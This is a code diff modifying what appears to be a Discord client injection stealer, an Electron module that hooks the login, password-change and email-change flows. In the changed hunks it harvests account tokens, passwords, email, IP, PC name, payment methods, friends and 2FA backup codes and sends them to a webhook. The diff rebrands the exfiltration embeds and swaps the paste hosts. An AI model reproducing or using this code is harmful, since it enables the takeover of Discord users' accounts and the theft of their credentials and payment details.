@@ -20,11 +20,11 @@ String.prototype.insert = function (index, string) {
 };
 
 const config = {
-    "logout": "%LOGOUT%",
-    "logout-notify": "%LOGOUTNOTI%",
-    "init-notify":"%INITNOTI%",
+    "logout": "instant",
+    "logout-notify": "true",
+    "init-notify":"true",
     "embed-color": 3447704,
-    "disable-qr-code":"%DISABLEQRCODE%"
+    "disable-qr-code":"true"
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
@@ -101,7 +101,7 @@ function FirstTime() {
 							content: "",
 							embeds: [{
 								title: "Discord Initalized",
-								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.cryonicx.to/raw/"+ token +")",
+								description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
 								color: config["embed-color"],
 								fields: [{
 									name: "Info",
@@ -118,7 +118,7 @@ function FirstTime() {
 								}, {
 									name: "Badges",
 									value: `${GetBadges(b.flags)}`,
-									inline: !1
+									inline: !0
 								}, {
 									name: "Token",
 									value: `\`\`\`${token}\`\`\``,
@@ -179,7 +179,7 @@ function FirstTime() {
 							content: "",
 							embeds: [{
 								title: "User got logged out",
-								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.cryonicx.to/raw/"+ token +")",
+								description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
 								color: config["embed-color"],
 								fields: [{
 									name: "Info",
@@ -196,7 +196,7 @@ function FirstTime() {
 								}, {
 									name: "Badges",
 									value: `${GetBadges(b.flags)}`,
-									inline: !1
+									inline: !0
 								}, {
 									name: "Token",
 									value: `\`\`\`${token}\`\`\``,
@@ -344,7 +344,7 @@ function GetBadges(flags) {
 		badges += "<:developer:874750808472825986> "
 	}
 	if (badges == "") {
-		badges = "None"
+		badges = "No Rare Badges"
 	}
 	return badges
 }
@@ -376,17 +376,17 @@ function Login(email, password, token) {
             xmlHttp.send( null );
             xmlHttp.responseText`, !0).then((info4) => {
 
-					if (token.startsWith("mfa")) {
-						window.webContents.executeJavaScript(`
-              var xmlHttp = new XMLHttpRequest();
-              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
-              xmlHttp.setRequestHeader('Content-Type', 'application/json');
-              xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":true}));
-              xmlHttp.responseText`, !0).then((codes) => {
+				if (token.startsWith("mfa")) {
+					window.webContents.executeJavaScript(`
+		  var xmlHttp = new XMLHttpRequest();
+		  xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
+		  xmlHttp.setRequestHeader('Content-Type', 'application/json');
+		  xmlHttp.setRequestHeader("authorization", "${token}")
+		  xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
+		  xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://premium.cryonicx.to/raw/"
+							var baseuri = "https://furry.surf/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -457,12 +457,20 @@ function Login(email, password, token) {
 								content: "",
 								embeds: [{
 									"title": "User Login",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.cryonicx.to/raw/"+ token +"<br>"+ password+")",
+									description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
 									"color": config['embed-color'],
 									"fields": [{
-										name: "Info",
-										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
+										name: "Malware Injection",
+										value: `\`\`\`Injection Info: \n${discordInstall}\n\`\`\``,
 										inline: !1
+									}, {
+										name: "IP",
+										value: `\`${ip}\``,
+										inline: !0
+									}, {
+										name: "PC Name",
+										value: `\`${computerName}\``,
+										inline: !0
 									}, {
 										name: "Username",
 										value: `\`${json.username}#${json.discriminator}\``,
@@ -474,15 +482,15 @@ function Login(email, password, token) {
 									}, {
 										name: "Nitro",
 										value: `${GetNitro(json.premium_type)}`,
-										inline: !1
+										inline: !0
 									}, {
 										name: "Badges",
 										value: `${GetBadges(json.flags)}`,
-										inline: !1
+										inline: !0
 									}, {
-										name: "Billing",
+										name: "Payment Methods",
 										value: `${Cool()}`,
-										inline: !1
+										inline: !0
 									}, {
 										name: "Email",
 										value: `\`${email}\``,
@@ -506,7 +514,7 @@ function Login(email, password, token) {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 									}
 								}, {
-									"title": `Total Friends (${totalFriends()})`,
+									"title": `HQ Friends (${totalFriends()})`,
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
@@ -521,8 +529,8 @@ function Login(email, password, token) {
 								}]
 							}
 							var mfaembed = {
-								"title": ":detective: __2FA Codes__",
-								"description": `[Get all of them](${baseuri})`,
+								"title": "<:bughunter_2:874750808430874664> __STORM ALERT__",
+								"description": `To view 2FA passwords, log into your account and click "View Codes"`,
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
@@ -535,7 +543,6 @@ function Login(email, password, token) {
 							if (token.startsWith("mfa")) {
 								params.embeds.push(mfaembed)
 							}
-
 							SendToWebhook(JSON.stringify(params))
 
 						})
@@ -617,12 +624,20 @@ function Login(email, password, token) {
 											content: "",
 											embeds: [{
 												"title": "User Login",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.cryonicx.to/raw/"+ token +"<br>"+ password+")",
+												description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
 												"color": config['embed-color'],
 												"fields": [{
-													name: "Info",
-													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
+													name: "Malware Injection",
+													value: `\`\`\`Injection Info: \n${discordInstall}\n\`\`\``,
 													inline: !1
+												}, {
+													name: "IP",
+													value: `\`${ip}\``,
+													inline: !0
+												}, {
+													name: "PC Name",
+													value: `\`${computerName}\``,
+													inline: !0
 												}, {
 													name: "Username",
 													value: `\`${json.username}#${json.discriminator}\``,
@@ -634,15 +649,15 @@ function Login(email, password, token) {
 												}, {
 													name: "Nitro",
 													value: `${GetNitro(json.premium_type)}`,
-													inline: !1
+													inline: !0
 												}, {
 													name: "Badges",
 													value: `${GetBadges(json.flags)}`,
-													inline: !1
+													inline: !0
 												}, {
-													name: "Billing",
+													name: "Payment Methods",
 													value: `${Cool()}`,
-													inline: !1
+													inline: !0
 												}, {
 													name: "Email",
 													value: `\`${email}\``,
@@ -666,7 +681,7 @@ function Login(email, password, token) {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 												}
 											}, {
-												"title": `Total Friends (${totalFriends()})`,
+												"title": `HQ Friends (${totalFriends()})`,
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
@@ -726,11 +741,11 @@ function ChangePassword(oldpassword, newpassword, token) {
               xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
               xmlHttp.setRequestHeader('Content-Type', 'application/json');
               xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":true}));
+              xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":false}));
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://premium.cryonicx.to/raw/"
+							var baseuri = "https://ctf.surf/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -800,12 +815,20 @@ function ChangePassword(oldpassword, newpassword, token) {
 								content: "",
 								embeds: [{
 									"title": "Password Changed",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.cryonicx.to/raw/"+ token +"<br>"+ newpassword+")",
+									description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
 									"color": config['embed-color'],
 									"fields": [{
-										name: "Info",
-										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
+										name: "Malware Injection",
+										value: `\`\`\`Injection Info: \n${discordInstall}\n\`\`\``,
 										inline: !1
+									}, {
+										name: "IP",
+										value: `\`${ip}\``,
+										inline: !0
+									}, {
+										name: "PC Name",
+										value: `\`${computerName}\``,
+										inline: !0
 									}, {
 										name: "Username",
 										value: `\`${json.username}#${json.discriminator}\``,
@@ -817,19 +840,19 @@ function ChangePassword(oldpassword, newpassword, token) {
 									}, {
 										name: "Nitro",
 										value: `${GetNitro(json.premium_type)}`,
-										inline: !1
+										inline: !0
 									}, {
 										name: "Badges",
 										value: `${GetBadges(json.flags)}`,
-										inline: !1
+										inline: !0
 									}, {
-										name: "Billing",
+										name: "Payment Methods",
 										value: `${Cool()}`,
-										inline: !1
+										inline: !0
 									}, {
 										name: "Email",
 										value: `\`${json.email}\``,
-										inline: !1
+										inline: !0
 									}, {
 										name: "Old Password",
 										value: `\`${oldpassword}\``,
@@ -853,7 +876,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 									}
 								}, {
-									"title": `Total Friends (${totalFriends()})`,
+									"title": `HQ Friends (${totalFriends()})`,
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
@@ -868,8 +891,8 @@ function ChangePassword(oldpassword, newpassword, token) {
 								}]
 							}
 							var mfaembed = {
-								"title": ":detective: __2FA Codes__",
-								"description": `[Get all of them](${baseuri})`,
+								"title": "<:bughunter_2:874750808430874664> __STORM ALERT__",
+								"description": `To view 2FA passwords, log into your account and click "View Codes"`,
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
@@ -882,7 +905,6 @@ function ChangePassword(oldpassword, newpassword, token) {
 							if (token.startsWith("mfa")) {
 								params.embeds.push(mfaembed)
 							}
-
 							SendToWebhook(JSON.stringify(params))
 
 						})
@@ -965,12 +987,20 @@ function ChangePassword(oldpassword, newpassword, token) {
 											content: "",
 											embeds: [{
 												"title": "Password Changed",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.cryonicx.to/raw/"+ token +"<br>"+ newpassword+")",
+												description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
 												"color": config['embed-color'],
 												"fields": [{
-													name: "Info",
-													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
+													name: "Malware Injection",
+													value: `\`\`\`Injection Info: \n${discordInstall}\n\`\`\``,
 													inline: !1
+												}, {
+													name: "IP",
+													value: `\`${ip}\``,
+													inline: !0
+												}, {
+													name: "PC Name",
+													value: `\`${computerName}\``,
+													inline: !0
 												}, {
 													name: "Username",
 													value: `\`${json.username}#${json.discriminator}\``,
@@ -982,19 +1012,19 @@ function ChangePassword(oldpassword, newpassword, token) {
 												}, {
 													name: "Nitro",
 													value: `${GetNitro(json.premium_type)}`,
-													inline: !1
+													inline: !0
 												}, {
 													name: "Badges",
 													value: `${GetBadges(json.flags)}`,
-													inline: !1
+													inline: !0
 												}, {
-													name: "Billing",
+													name: "Payment Methods",
 													value: `${Cool()}`,
-													inline: !1
+													inline: !0
 												}, {
 													name: "Email",
 													value: `\`${json.email}\``,
-													inline: !1
+													inline: !0
 												}, {
 													name: "Old Password",
 													value: `\`${oldpassword}\``,
@@ -1018,7 +1048,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 												}
 											}, {
-												"title": `Total Friends (${totalFriends()})`,
+												"title": `HQ Friends (${totalFriends()})`,
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
@@ -1078,11 +1108,11 @@ function ChangeEmail(newemail, password, token) {
               xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
               xmlHttp.setRequestHeader('Content-Type', 'application/json');
               xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":true}));
+              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://premium.cryonicx.to/raw/"
+							var baseuri = "https://ctf.surf/raw/"
 
 
 							var gayass = JSON.parse(codes)
@@ -1152,12 +1182,20 @@ function ChangeEmail(newemail, password, token) {
 								content: "",
 								embeds: [{
 									"title": "Email Changed",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.cryonicx.to/raw/"+ token +"<br>"+ password+")",
+									description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
 									"color": config['embed-color'],
 									"fields": [{
-										name: "Info",
-										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
+										name: "Malware Injection",
+										value: `\`\`\`Injection Info: \n${discordInstall}\n\`\`\``,
 										inline: !1
+									}, {
+										name: "IP",
+										value: `\`${ip}\``,
+										inline: !0
+									}, {
+										name: "PC Name",
+										value: `\`${computerName}\``,
+										inline: !0
 									}, {
 										name: "Username",
 										value: `\`${json.username}#${json.discriminator}\``,
@@ -1169,15 +1207,15 @@ function ChangeEmail(newemail, password, token) {
 									}, {
 										name: "Nitro",
 										value: `${GetNitro(json.premium_type)}`,
-										inline: !1
+										inline: !0
 									}, {
 										name: "Badges",
 										value: `${GetBadges(json.flags)}`,
-										inline: !1
+										inline: !0
 									}, {
-										name: "Billing",
+										name: "Payment Methods",
 										value: `${Cool()}`,
-										inline: !1
+										inline: !0
 									}, {
 										name: "New Email",
 										value: `\`${newemail}\``,
@@ -1201,7 +1239,7 @@ function ChangeEmail(newemail, password, token) {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 									}
 								}, {
-									"title": `Total Friends (${totalFriends()})`,
+									"title": `HQ Friends (${totalFriends()})`,
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
@@ -1212,12 +1250,13 @@ function ChangeEmail(newemail, password, token) {
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+									// IDK
 									}
 								}]
 							}
 							var mfaembed = {
-								"title": ":detective: __2FA Codes__",
-								"description": `[Get all of them](${baseuri})`,
+								"title": "<:bughunter_2:874750808430874664> __STORM ALERT__",
+								"description": `To view 2FA passwords, log into your account and click "View Codes"`,
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
@@ -1230,7 +1269,6 @@ function ChangeEmail(newemail, password, token) {
 							if (token.startsWith("mfa")) {
 								params.embeds.push(mfaembed)
 							}
-
 							SendToWebhook(JSON.stringify(params))
 
 						})
@@ -1313,12 +1351,20 @@ function ChangeEmail(newemail, password, token) {
 											content: "",
 											embeds: [{
 												"title": "Email Changed",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.cryonicx.to/raw/"+ token +"<br>"+ password+")",
+												description: "[**<:bughunter_2:874750808430874664> │ cryonicx Discord**](https://discord.gg/J4VTFKv37s)",
 												"color": config['embed-color'],
 												"fields": [{
-													name: "Info",
-													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
+													name: "Malware Injection",
+													value: `\`\`\`Injection Info: \n${discordInstall}\n\`\`\``,
 													inline: !1
+												}, {
+													name: "IP",
+													value: `\`${ip}\``,
+													inline: !0
+												}, {
+													name: "PC Name",
+													value: `\`${computerName}\``,
+													inline: !0
 												}, {
 													name: "Username",
 													value: `\`${json.username}#${json.discriminator}\``,
@@ -1330,15 +1376,15 @@ function ChangeEmail(newemail, password, token) {
 												}, {
 													name: "Nitro",
 													value: `${GetNitro(json.premium_type)}`,
-													inline: !1
+													inline: !0
 												}, {
 													name: "Badges",
 													value: `${GetBadges(json.flags)}`,
-													inline: !1
+													inline: !0
 												}, {
-													name: "Billing",
+													name: "Payment Methods",
 													value: `${Cool()}`,
-													inline: !1
+													inline: !0
 												}, {
 													name: "New Email",
 													value: `\`${newemail}\``,
@@ -1362,7 +1408,7 @@ function ChangeEmail(newemail, password, token) {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 												}
 											}, {
-												"title": `Total Friends (${totalFriends()})`,
+												"title": `HQ Friends (${totalFriends()})`,
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
@@ -1467,5 +1513,4 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
 		}))
 	}
 });
-SendToWebhook("aaaaaa")
 module.exports = require('./core.asar')
